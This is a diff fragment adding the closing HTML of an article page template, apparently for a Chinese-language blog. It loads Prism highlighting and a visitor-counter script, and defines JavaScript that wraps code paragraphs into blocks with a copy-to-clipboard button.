+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+<script>
+// 一键复制代码
+function copyCode(btn) {{
+  var block = btn.closest('.code-block') || btn.closest('.inline-code-block');
+  var code = block.querySelector('code').innerText;
+  navigator.clipboard.writeText(code).then(function() {{
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(function() {{ btn.textContent = 'Copy'; btn.classList.remove('copied'); }}, 2000);
+  }}).catch(function() {{
+    // fallback
+    var ta = document.createElement('textarea');
+    ta.value = code;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(function() {{ btn.textContent = 'Copy'; btn.classList.remove('copied'); }}, 2000);
+  }});
+}}
+
+// 自动包装连续的代码段落为整体代码块并添加复制按钮
+document.addEventListener('DOMContentLoaded', function() {{
+  var all = document.querySelectorAll('.article-body > p[data-code="true"]');
+  if (!all.length) return;
+  // 分组连续段落
+  var groups = [];
+  var cur = [];
+  all.forEach(function(p) {{
+    if (cur.length === 0 || p.previousElementSibling === cur[cur.length - 1]) {{
+      cur.push(p);
+    }} else {{
+      groups.push(cur);
+      cur = [p];
+    }}
+  }});
+  if (cur.length) groups.push(cur);
+  // 每组包装为一个代码块
+  groups.forEach(function(grp) {{
+    var codes = grp.map(function(p) {{ return p.innerHTML.trim(); }}).join('
+');
+    if (!codes) return;
+    var wrapper = document.createElement('div');
+    wrapper.className = 'inline-code-block';
+    wrapper.innerHTML = '<div class="code-header"><span class="code-lang">Code</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>' + codes + '</code></pre></div>';
+    grp[0].parentNode.insertBefore(wrapper, grp[0]);
+    grp.forEach(function(p) {{ p.parentNode.removeChild(p); }});
+  }});
+  if (typeof Prism !== 'undefined') {{
+    Prism.highlightAll();
+  }}
+}});
+</script>
+<script src="../js/interactions.js"></script>
+<script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
